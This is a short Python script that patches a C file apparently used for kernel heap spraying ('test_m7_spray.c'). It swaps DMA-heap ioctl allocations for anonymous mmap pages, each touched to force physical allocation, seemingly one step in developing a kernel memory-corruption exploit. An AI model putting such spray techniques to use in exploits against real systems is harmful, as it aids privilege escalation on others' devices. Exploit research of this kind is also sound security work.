with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

old_spray = """        for (int i = 0; i < PAGES_PER; i++) {
            struct dma_heap_allocation_data alloc = { .len = 4096, .fd_flags = O_RDWR | O_CLOEXEC, .heap_flags = 0 };
            int ret = ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc);
            if (ret < 0) {
                printf("[-] alloc failed round %d iter %d\\n", r, i);
                break;
            }
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);"""

new_spray = """        for (int i = 0; i < PAGES_PER; i++) {
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (p == MAP_FAILED) {
                printf("[-] mmap failed round %d iter %d\\n", r, i);
                break;
            }
            // Page fault it to force physical allocation
            *(volatile char *)p = 0;"""

text = text.replace(old_spray, new_spray)

with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
